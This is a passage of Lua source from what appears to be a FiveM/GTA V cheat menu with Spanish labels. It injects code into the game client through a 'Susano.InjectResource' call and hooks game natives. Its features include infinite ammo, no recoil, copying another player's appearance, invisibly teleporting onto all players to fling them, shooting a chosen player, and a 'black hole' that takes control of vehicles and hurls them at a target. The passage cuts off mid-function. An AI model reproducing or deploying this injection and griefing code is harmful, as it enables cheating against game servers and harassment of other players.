                                            GetHashKey("COMPONENT_AT_AR_AFGRIP"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MEDIUM"),
                                            GetHashKey("COMPONENT_AT_SCOPE_SMALL"),
                                            GetHashKey("COMPONENT_AT_SCOPE_LARGE"),
                                            GetHashKey("COMPONENT_AT_PI_FLSH"),
                                            GetHashKey("COMPONENT_AT_PI_SUPP_02"),
                                            GetHashKey("COMPONENT_AT_SR_SUPP"),
                                            GetHashKey("COMPONENT_AT_SR_FLSH"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MAX"),
                                        }

                                        for _, componentHash in ipairs(components) do
                                            if componentHash and componentHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, componentHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    Actions.giveSuppressorItem = FindItem("Combate", "General", "Dar silenciador")
                    if Actions.giveSuppressorItem then
                        Actions.giveSuppressorItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local suppressors = {
                                            GetHashKey("COMPONENT_AT_AR_SUPP_02"),
                                            GetHashKey("COMPONENT_AT_PI_SUPP_02"),
                                            GetHashKey("COMPONENT_AT_SR_SUPP"),
                                            GetHashKey("COMPONENT_AT_AR_SUPP"),
                                            GetHashKey("COMPONENT_AT_PI_SUPP"),
                                        }

                                        for _, suppressorHash in ipairs(suppressors) do
                                            if suppressorHash and suppressorHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, suppressorHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    Actions.giveFlashlightItem = FindItem("Combate", "General", "Dar linterna")
                    if Actions.giveFlashlightItem then
                        Actions.giveFlashlightItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local flashlights = {
                                            GetHashKey("COMPONENT_AT_AR_FLSH"),
                                            GetHashKey("COMPONENT_AT_PI_FLSH"),
                                            GetHashKey("COMPONENT_AT_SR_FLSH"),
                                        }

                                        for _, flashlightHash in ipairs(flashlights) do
                                            if flashlightHash and flashlightHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, flashlightHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    Actions.giveGripItem = FindItem("Combate", "General", "Dar agarre")
                    if Actions.giveGripItem then
                        Actions.giveGripItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local grips = {
                                            GetHashKey("COMPONENT_AT_AR_AFGRIP"),
                                        }

                                        for _, gripHash in ipairs(grips) do
                                            if gripHash and gripHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, gripHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    Actions.giveScopeItem = FindItem("Combate", "General", "Dar mira")
                    if Actions.giveScopeItem then
                        Actions.giveScopeItem.onClick = function()
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", [[
                                    local ped = PlayerPedId()
                                    if not ped or not DoesEntityExist(ped) then return end

                                    local currentWeapon = GetSelectedPedWeapon(ped)
                                    if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                                        local scopes = {
                                            GetHashKey("COMPONENT_AT_SCOPE_SMALL"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MEDIUM"),
                                            GetHashKey("COMPONENT_AT_SCOPE_LARGE"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MAX"),
                                            GetHashKey("COMPONENT_AT_SCOPE_MACRO"),
                                            GetHashKey("COMPONENT_AT_SCOPE_NV"),
                                            GetHashKey("COMPONENT_AT_SCOPE_THERMAL"),
                                        }

                                        for _, scopeHash in ipairs(scopes) do
                                            if scopeHash and scopeHash ~= 0 then
                                                GiveWeaponComponentToPed(ped, currentWeapon, scopeHash)
                                            end
                                        end
                                    end
                                ]])
                            end
                        end
                    end

                    Actions.noReloadItem = FindItem("Combate", "General", "Sin recarga")
                    if Actions.noReloadItem then
                        Actions.noReloadItem.onClick = function(value)
                            Menu.noReloadEnabled = value
                            if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                                Susano.InjectResource("any", string.format([[
                                    if not _G then _G = {} end
                                    _G.noReloadEnabled = %s

                                    CreateThread(function()
                                        while true do
                                            Wait(0)
                                            if _G.noReloadEnabled then
                                                local playerPed = PlayerPedId()
                                                if playerPed and DoesEntityExist(playerPed) then
                                                    local currentWeapon = GetSelectedPedWeapon(playerPed)
                                                    if currentWeapon ~= GetHashKey("WEAPON_UNARMED") and currentWeapon ~= 0 then
                                                        SetAmmoInClip(playerPed, currentWeapon, 9999)
                                                        SetPedAmmo(playerPed, currentWeapon, 9999)
                                                    end
                                                end
                                            else
                                                Wait(100)
                                            end
                                        end
                                    end)
                                ]], tostring(value)))
                            end
                        end
                    end

                    CreateThread(function()
                        while true do
                            Wait(0)

                            if Menu.noRecoilEnabled then
                                local ped = PlayerPedId()
                                local weapon = GetSelectedPedWeapon(ped)
                                if weapon ~= GetHashKey("WEAPON_UNARMED") then
                                    SetWeaponRecoilShakeAmplitude(weapon, 0.0)
                                end
                            end
                        end
                    end)

if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
    Susano.InjectResource("any", [[
        if not _G.drawFovEnabled then _G.drawFovEnabled = false end
        if not _G.fovRadius then _G.fovRadius = 150.0 end
    ]])
end

function Menu.ActionCopyAppearance()
    if not Menu.SelectedPlayer then return end

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local function hNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then return end
                _G[nativeName] = function(...) return newFunction(originalNative, ...) end
            end

            hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedComponentVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedDrawableVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedTextureVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedPaletteVariation", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedPropIndex", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedPropIndex", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedPropTextureIndex", function(originalFn, ...) return originalFn(...) end)
            hNative("ClearPedProp", function(originalFn, ...) return originalFn(...) end)
            hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHeadBlendData", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHeadBlendData", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedFaceFeature", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedFaceFeature", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHairColor", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHairHighlightColor", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHairColor", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedEyeColor", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedEyeColor", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHeadOverlay", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHeadOverlay", function(originalFn, ...) return originalFn(...) end)
            hNative("GetPedHeadOverlayColor", function(originalFn, ...) return originalFn(...) end)
            hNative("SetPedHeadOverlayColor", function(originalFn, ...) return originalFn(...) end)

            local targetServerId = %d

            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then return end

            local targetPed = GetPlayerPed(targetPlayerId)
            local myPed = PlayerPedId()

            if not DoesEntityExist(targetPed) or not DoesEntityExist(myPed) then return end

            ClonePedToTarget(targetPed, myPed)

            Wait(100)

            for componentId = 0, 11 do
                local drawable = GetPedDrawableVariation(targetPed, componentId)
                local texture = GetPedTextureVariation(targetPed, componentId)
                local palette = GetPedPaletteVariation(targetPed, componentId)
                SetPedComponentVariation(myPed, componentId, drawable, texture, palette)
            end

            for propId = 0, 7 do
                local prop = GetPedPropIndex(targetPed, propId)
                local texture = GetPedPropTextureIndex(targetPed, propId)
                if prop ~= -1 then
                    SetPedPropIndex(myPed, propId, prop, texture, true)
                else
                    ClearPedProp(myPed, propId)
                end
            end

            local shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird, shapeMix, skinMix, thirdMix = GetPedHeadBlendData(targetPed)
            SetPedHeadBlendData(myPed, shapeFirst, shapeSecond, shapeThird, skinFirst, skinSecond, skinThird, shapeMix, skinMix, thirdMix)

            for i = 0, 19 do
                local value = GetPedFaceFeature(targetPed, i)
                SetPedFaceFeature(myPed, i, value)
            end

            local hairColor, highlightColor = GetPedHairColor(targetPed)
            SetPedHairColor(myPed, hairColor, highlightColor)

            local eyeColor = GetPedEyeColor(targetPed)
            SetPedEyeColor(myPed, eyeColor)

            for overlayId = 0, 12 do
                local overlayValue, overlayOpacity = GetPedHeadOverlay(targetPed, overlayId)
                local colorType, colorId, secondColorId = GetPedHeadOverlayColor(targetPed, overlayId)
                SetPedHeadOverlay(myPed, overlayId, overlayValue, overlayOpacity)
                if colorType == 1 then
                    SetPedHeadOverlayColor(myPed, overlayId, colorType, colorId, secondColorId)
                elseif colorType == 2 then
                    SetPedHeadOverlayColor(myPed, overlayId, colorType, colorId, secondColorId)
                end
            end
        ]], targetServerId))
    end
end

local shootPlayerLastShot = 0
local shootPlayerCooldown = 500

function Menu.ActionLaunchAll()
    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", [[
            CreateThread(function()
                local myPed = PlayerPedId()
                if not myPed then
                    return
                end

                
                local initialCoords = GetEntityCoords(myPed)
                local initialHeading = GetEntityHeading(myPed)
                if not initialCoords then
                    return
                end

                local players = GetActivePlayers()
                if not players then
                    return
                end

                for _, player in ipairs(players) do
                   
                    if not DoesEntityExist(myPed) then
                        break
                    end
                    
                    local clientId = player
                    if clientId and clientId ~= -1 then
                        local targetPed = GetPlayerPed(clientId)
                        if targetPed and DoesEntityExist(targetPed) and targetPed ~= myPed then
                            local targetCoords = GetEntityCoords(targetPed)
                            if targetCoords then
                                local currentCoords = GetEntityCoords(myPed)
                                if not currentCoords then
                                    break
                                end
                                
                                local distance = #(currentCoords - targetCoords)
                                local teleported = false

                                if distance > 10.0 then
                                    local angle = math.random() * 2 * math.pi
                                    local radiusOffset = math.random(5, 9)
                                    local xOffset = math.cos(angle) * radiusOffset
                                    local yOffset = math.sin(angle) * radiusOffset
                                    local newCoords = vector3(targetCoords.x + xOffset, targetCoords.y + yOffset, targetCoords.z)
                                    SetEntityCoordsNoOffset(myPed, newCoords.x, newCoords.y, newCoords.z, false, false, false)
                                    SetEntityVisible(myPed, false, 0)
                                    teleported = true
                                    Wait(30)
                                end

                                if DoesEntityExist(myPed) then
                                    ClearPedTasksImmediately(myPed)
                                    for i = 1, 10 do
                                        if not DoesEntityExist(targetPed) or not DoesEntityExist(myPed) then
                                            break
                                        end

                                        local curTargetCoords = GetEntityCoords(targetPed)
                                        if not curTargetCoords then
                                            break
                                        end

                                        SetEntityCoords(myPed, curTargetCoords.x, curTargetCoords.y, curTargetCoords.z + 0.5, false, false, false, false)
                                        Wait(30)
                                        
                                        if DoesEntityExist(myPed) and DoesEntityExist(targetPed) then
                                            AttachEntityToEntityPhysically(myPed, targetPed, 0, 0.0, 0.0, 0.0, 150.0, 0.0, 0.0, 0.0, 0.0, 0.0, 1, false, false, 1, 2)
                                            Wait(30)
                                            DetachEntity(myPed, true, true)
                                        end
                                        Wait(50)
                                    end

                                    Wait(100)
                                    if DoesEntityExist(myPed) then
                                        ClearPedTasksImmediately(myPed)
                                    end

                                    if teleported and DoesEntityExist(myPed) then
                                        SetEntityVisible(myPed, true, 0)
                                    end

                                    Wait(30)
                                end
                            end
                        end
                    end
                end

                
                Wait(500)
                
                
                if DoesEntityExist(myPed) and initialCoords then
                    
                    DetachEntity(myPed, true, true)
                    Wait(100)
                    
                    if DoesEntityExist(myPed) then
                        ClearPedTasksImmediately(myPed)
                        Wait(200)
                        
                        if DoesEntityExist(myPed) then
                            
                            SetEntityCoordsNoOffset(myPed, initialCoords.x, initialCoords.y, initialCoords.z, false, false, false)
                            Wait(100)
                            
                            if DoesEntityExist(myPed) then
                                SetEntityHeading(myPed, initialHeading)
                                SetEntityVisible(myPed, true, 0)
                            end
                        end
                    end
                end
            end)
        ]])
    end
end

function Menu.ActionShootPlayer()
    if not Menu.SelectedPlayer then
        return
    end

    local currentTime = GetGameTimer()
    if currentTime - shootPlayerLastShot < shootPlayerCooldown then
        return
    end
    shootPlayerLastShot = currentTime

    local targetServerId = Menu.SelectedPlayer

    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
        Susano.InjectResource("any", string.format([[
            local targetServerId = %d
            local targetPlayerId = nil
            for _, player in ipairs(GetActivePlayers()) do
                if GetPlayerServerId(player) == targetServerId then
                    targetPlayerId = player
                    break
                end
            end

            if not targetPlayerId then
                return
            end

            local targetPed = GetPlayerPed(targetPlayerId)
            if not DoesEntityExist(targetPed) then
                return
            end

            local playerPed = PlayerPedId()
            local selectedWeapon = nil

            local currentWeapon = GetSelectedPedWeapon(playerPed)
            if currentWeapon and currentWeapon ~= 0 and currentWeapon ~= GetHashKey("WEAPON_UNARMED") then
                if HasPedGotWeapon(playerPed, currentWeapon, false) then
                    selectedWeapon = currentWeapon
                end
            end

            if not selectedWeapon then
                local weapons = {
                    GetHashKey("WEAPON_PISTOL"),
                    GetHashKey("WEAPON_COMBATPISTOL"),
                    GetHashKey("WEAPON_APPISTOL"),
                    GetHashKey("WEAPON_PISTOL50"),
                    GetHashKey("WEAPON_MICROSMG"),
                    GetHashKey("WEAPON_SMG"),
                    GetHashKey("WEAPON_ASSAULTSMG"),
                    GetHashKey("WEAPON_ASSAULTRIFLE"),
                    GetHashKey("WEAPON_CARBINERIFLE"),
                    GetHashKey("WEAPON_ADVANCEDRIFLE"),
                    GetHashKey("WEAPON_PUMPSHOTGUN"),
                    GetHashKey("WEAPON_SAWNOFFSHOTGUN"),
                    GetHashKey("WEAPON_ASSAULTSHOTGUN"),
                    GetHashKey("WEAPON_SNIPERRIFLE"),
                    GetHashKey("WEAPON_HEAVYSNIPER"),
                    GetHashKey("WEAPON_MARKSMANRIFLE"),
                    GetHashKey("WEAPON_RPG"),
                    GetHashKey("WEAPON_GRENADELAUNCHER"),
                    GetHashKey("WEAPON_MINIGUN"),
                    GetHashKey("WEAPON_REVOLVER"),
                    GetHashKey("WEAPON_PISTOL_MK2"),
                    GetHashKey("WEAPON_SMG_MK2"),
                    GetHashKey("WEAPON_ASSAULTRIFLE_MK2"),
                    GetHashKey("WEAPON_CARBINERIFLE_MK2"),
                    GetHashKey("WEAPON_PUMPSHOTGUN_MK2"),
                    GetHashKey("WEAPON_SNSPISTOL"),
                    GetHashKey("WEAPON_HEAVYPISTOL"),
                    GetHashKey("WEAPON_VINTAGEPISTOL"),
                    GetHashKey("WEAPON_MACHINEPISTOL"),
                    GetHashKey("WEAPON_COMBATPDW"),
                    GetHashKey("WEAPON_MG"),
                    GetHashKey("WEAPON_COMBATMG"),
                    GetHashKey("WEAPON_COMBATMG_MK2"),
                    GetHashKey("WEAPON_GUSENBERG"),
                    GetHashKey("WEAPON_SPECIALCARBINE"),
                    GetHashKey("WEAPON_BULLPUPRIFLE"),
                    GetHashKey("WEAPON_COMPACTRIFLE"),
                    GetHashKey("WEAPON_BULLPUPSHOTGUN"),
                    GetHashKey("WEAPON_MUSKET"),
                    GetHashKey("WEAPON_HEAVYSHOTGUN"),
                    GetHashKey("WEAPON_DBSHOTGUN"),
                    GetHashKey("WEAPON_AUTOSHOTGUN"),
                    GetHashKey("WEAPON_MARKSMANRIFLE_MK2"),
                    GetHashKey("weapon_SCOM"),
                    GetHashKey("weapon_mcx"),
                    GetHashKey("weapon_grau"),
                    GetHashKey("weapon_midasgun"),
                    GetHashKey("weapon_hackingdevice"),
                    GetHashKey("weapon_akorus"),
                    GetHashKey("WEAPON_MIDGARD")
                }

                for _, weaponHash in ipairs(weapons) do
                    if HasPedGotWeapon(playerPed, weaponHash, false) then
                        selectedWeapon = weaponHash
                        break
                    end
                end
            end

            if not selectedWeapon then
                return
            end

            local originalWeapon = GetSelectedPedWeapon(playerPed)
            SetCurrentPedWeapon(playerPed, selectedWeapon, true)

            Wait(50)

            local targetCoords = GetEntityCoords(targetPed)

            local startCoords = vector3(
                targetCoords.x + math.random(-20, 20) / 100.0,
                targetCoords.y + math.random(-20, 20) / 100.0,
                targetCoords.z + math.random(10, 30) / 100.0
            )

            local targetBodyCoords = vector3(
                targetCoords.x,
                targetCoords.y,
                targetCoords.z
            )

            ShootSingleBulletBetweenCoords(
                startCoords.x, startCoords.y, startCoords.z,
                targetBodyCoords.x, targetBodyCoords.y, targetBodyCoords.z,
                25, true, selectedWeapon, playerPed, true, false, 1000.0
            )

            Wait(100)

            if originalWeapon and originalWeapon ~= 0 and originalWeapon ~= GetHashKey("WEAPON_UNARMED") then
                if HasPedGotWeapon(playerPed, originalWeapon, false) then
                    SetCurrentPedWeapon(playerPed, originalWeapon, true)
                else
                    SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_UNARMED"), true)
                end
            else
                SetCurrentPedWeapon(playerPed, GetHashKey("WEAPON_UNARMED"), true)
            end
        ]], targetServerId))
    end
end

                    function Menu.ActionBlackHole()
                        if not Menu.SelectedPlayer then return end

                        local targetServerId = Menu.SelectedPlayer

                        if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
                            Susano.InjectResource("any", string.format([[
                if _G.black_hole_active then
                    _G.black_hole_active = false
                    _G.black_hole_vehicles = {}
                    _G.black_hole_target_player = nil
                    _G.black_hole_last_scan = 0
                    return
                end

                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                hNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                hNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameplayCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamFov", function(originalFn, ...) return originalFn(...) end)
                hNative("SetCamActive", function(originalFn, ...) return originalFn(...) end)
                hNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                hNative("GetEntityModel", function(originalFn, ...) return originalFn(...) end)
                hNative("RequestModel", function(originalFn, ...) return originalFn(...) end)
                hNative("HasModelLoaded", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("StartShapeTestRay", function(originalFn, ...) return originalFn(...) end)
                hNative("GetShapeTestResult", function(originalFn, ...) return originalFn(...) end)
                hNative("CreatePed", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                hNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetBlockingOfNonTemporaryEvents", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedCanRagdoll", function(originalFn, ...) return originalFn(...) end)
                hNative("ClonePedToTarget", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityLocallyInvisible", function(originalFn, ...) return originalFn(...) end)
                hNative("FindFirstVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("FindNextVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("EndFindVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehicleClass", function(originalFn, ...) return originalFn(...) end)
                hNative("GetVehiclePedIsIn", function(originalFn, ...) return originalFn(...) end)
                hNative("GetPedInVehicleSeat", function(originalFn, ...) return originalFn(...) end)
                hNative("SetPedIntoVehicle", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityAsMissionEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkGetEntityIsNetworked", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkRequestControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("NetworkHasControlOfEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityCoordsNoOffset", function(originalFn, ...) return originalFn(...) end)
                hNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                hNative("DeleteEntity", function(originalFn, ...) return originalFn(...) end)
                hNative("SetModelAsNoLongerNeeded", function(originalFn, ...) return originalFn(...) end)
                hNative("GetGameTimer", function(originalFn, ...) return originalFn(...) end)
                hNative("SetEntityVelocity", function(originalFn, ...) return originalFn(...) end)

                if not _G.black_hole_active then
                    _G.black_hole_active = false
                end
                if not _G.black_hole_vehicles then
                    _G.black_hole_vehicles = {}
                end
                if not _G.black_hole_target_player then
                    _G.black_hole_target_player = nil
                end
                if not _G.black_hole_last_scan then
                    _G.black_hole_last_scan = 0
                end

                local targetServerId = %d
                local targetPlayerId = nil
                for _, player in ipairs(GetActivePlayers()) do
                    if GetPlayerServerId(player) == targetServerId then
                        targetPlayerId = player
                        break
                    end
                end

                if not targetPlayerId then
                    return
                end

                    local playerPed = PlayerPedId()
                    local myCoords = GetEntityCoords(playerPed)
                    local myHeading = GetEntityHeading(playerPed)

                    _G.black_hole_active = true
                    _G.black_hole_vehicles = {}
                    _G.black_hole_target_player = targetPlayerId

                    local blackHoleCam = CreateCam('DEFAULT_SCRIPTED_CAMERA', true)
                    local camCoords = GetGameplayCamCoord()
                    local camRot = GetGameplayCamRot(2)
                    SetCamCoord(blackHoleCam, camCoords.x, camCoords.y, camCoords.z)
                    SetCamRot(blackHoleCam, camRot.x, camRot.y, camRot.z, 2)
                    SetCamFov(blackHoleCam, GetGameplayCamFov())
                    SetCamActive(blackHoleCam, true)
                    RenderScriptCams(true, false, 0, true, true)

                    local playerModel = GetEntityModel(playerPed)
                    RequestModel(playerModel)
                    local timeout = 0
                    while not HasModelLoaded(playerModel) and timeout < 50 do
                        Wait(50)
                        timeout = timeout + 1
                    end

                    local groundZ = myCoords.z
                    local rayHandle = StartShapeTestRay(myCoords.x, myCoords.y, myCoords.z + 2.0, myCoords.x, myCoords.y, myCoords.z - 100.0, 1, 0, 0)
                    local _, hit, hitCoords, _, _ = GetShapeTestResult(rayHandle)
                    if hit then
                        groundZ = hitCoords.z
                    end

                    local clonePed = CreatePed(4, playerModel, myCoords.x, myCoords.y, groundZ, myHeading, false, false)
                    SetEntityCollision(clonePed, false, false)
                    FreezeEntityPosition(clonePed, true)
                    SetEntityInvincible(clonePed, true)
                    SetBlockingOfNonTemporaryEvents(clonePed, true)
                    SetPedCanRagdoll(clonePed, false)
                    ClonePedToTarget(playerPed, clonePed)

                    SetEntityVisible(playerPed, false, false)

                    local emptyVehicles = {}
                    local searchRadius = 1000.0
                    local vehHandle, veh = FindFirstVehicle()
                    local success

                    repeat
                        local vehCoords = GetEntityCoords(veh)
                        local distance = #(myCoords - vehCoords)
                        local vehClass = GetVehicleClass(veh)
                        local driver = GetPedInVehicleSeat(veh, -1)
                        local isEmpty = (driver == 0 or not DoesEntityExist(driver))

                        if distance <= searchRadius and veh ~= GetVehiclePedIsIn(playerPed, false) and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                            table.insert(emptyVehicles, {handle = veh, distance = distance})
                        end

                        success, veh = FindNextVehicle(vehHandle)
                    until not success

                    EndFindVehicle(vehHandle)

                    if #emptyVehicles == 0 then
                        SetEntityVisible(playerPed, true, false)
                        SetCamActive(blackHoleCam, false)
                        RenderScriptCams(false, false, 0, true, true)
                        DestroyCam(blackHoleCam, true)
                        if DoesEntityExist(clonePed) then
                            DeleteEntity(clonePed)
                        end
                        SetModelAsNoLongerNeeded(playerModel)
                        _G.black_hole_active = false
                        return
                    end

                    table.sort(emptyVehicles, function(a, b) return a.distance < b.distance end)
                    while #emptyVehicles > 6 do
                        table.remove(emptyVehicles)
                    end

                    for i, vehData in ipairs(emptyVehicles) do
                        local veh = vehData.handle
                        if DoesEntityExist(veh) and _G.black_hole_active then
                            SetPedIntoVehicle(playerPed, veh, -1)
                            Wait(150)

                            SetEntityAsMissionEntity(veh, true, true)
                            if NetworkGetEntityIsNetworked(veh) then
                                NetworkRequestControlOfEntity(veh)
                                local timeout = 0
                                while not NetworkHasControlOfEntity(veh) and timeout < 50 do
                                    NetworkRequestControlOfEntity(veh)
                                    Wait(10)
                                    timeout = timeout + 1
                                end
                            end

                            SetEntityCoordsNoOffset(playerPed, myCoords.x, myCoords.y, myCoords.z, false, false, false)
                            SetEntityHeading(playerPed, myHeading)
                            Wait(50)
                        end
                    end

                    SetEntityVisible(playerPed, true, false)
                    SetCamActive(blackHoleCam, false)
                    RenderScriptCams(false, false, 0, true, true)
                    DestroyCam(blackHoleCam, true)
                    if DoesEntityExist(clonePed) then
                        DeleteEntity(clonePed)
                    end
                    SetModelAsNoLongerNeeded(playerModel)

                    _G.black_hole_vehicles = emptyVehicles

                CreateThread(function()
                    while not _G.black_hole_vehicles or #_G.black_hole_vehicles == 0 do
                        if not _G.black_hole_active then
                            return
                        end
                        Wait(100)
                    end

                    while true do
                        Wait(100)

                        if not _G.black_hole_active then
                            break
                        end

                        local targetPlayerId = _G.black_hole_target_player
                        if not targetPlayerId then
                            _G.black_hole_active = false
                            break
                        end

                        local targetPed = GetPlayerPed(targetPlayerId)
                        if not DoesEntityExist(targetPed) then
                            _G.black_hole_active = false
                            break
                        end

                        local currentTargetCoords
                        local targetVehicle = GetVehiclePedIsIn(targetPed, false)

                        if targetVehicle and targetVehicle ~= 0 and DoesEntityExist(targetVehicle) then
                            currentTargetCoords = GetEntityCoords(targetVehicle)
                        else
                            currentTargetCoords = GetEntityCoords(targetPed)
                        end

                        local vehicles = _G.black_hole_vehicles or {}

                        local currentTime = GetGameTimer()
                        if not _G.black_hole_last_scan or (currentTime - _G.black_hole_last_scan) > 2000 then
                            _G.black_hole_last_scan = currentTime

                            local searchRadius = 1000.0
                            local vehHandle, veh = FindFirstVehicle()
                            local success
                            local existingVehicleHandles = {}

                            for _, vehData in ipairs(vehicles) do
                                if DoesEntityExist(vehData.handle) then
                                    existingVehicleHandles[vehData.handle] = true
                                end
                            end

                            repeat
                                if DoesEntityExist(veh) then
                                    local vehCoords = GetEntityCoords(veh)
                                    local distance = #(currentTargetCoords - vehCoords)
                                    local vehClass = GetVehicleClass(veh)
                                    local driver = GetPedInVehicleSeat(veh, -1)
                                    local isEmpty = (driver == 0 or not DoesEntityExist(driver))

                                    if not existingVehicleHandles[veh] and distance <= searchRadius and veh ~= targetVehicle and vehClass ~= 8 and vehClass ~= 13 and isEmpty then
                                        table.insert(vehicles, {handle = veh, distance = distance})
                                        existingVehicleHandles[veh] = true
                                    end
                                end

                                success, veh = FindNextVehicle(vehHandle)
                            until not success

                            EndFindVehicle(vehHandle)

                            _G.black_hole_vehicles = vehicles
                        end

                        for _, vehData in ipairs(vehicles) do
                            local veh = vehData.handle
                            if DoesEntityExist(veh) then
                                if veh ~= targetVehicle then
                                    local vehCoords = GetEntityCoords(veh)
                                    local directionX = currentTargetCoords.x - vehCoords.x
                                    local directionY = currentTargetCoords.y - vehCoords.y
                                    local directionZ = currentTargetCoords.z - vehCoords.z

                                    local distance = math.sqrt(directionX * directionX + directionY * directionY + directionZ * directionZ)

                                    if distance > 2.0 then
                                        local normX = directionX / distance
                                        local normY = directionY / distance
                                        local normZ = directionZ / distance

                                        local attractionForce = math.min(50.0, 1000.0 / math.max(distance, 1.0))

                                        SetEntityVelocity(veh, normX * attractionForce, normY * attractionForce, normZ * attractionForce)
                                    else
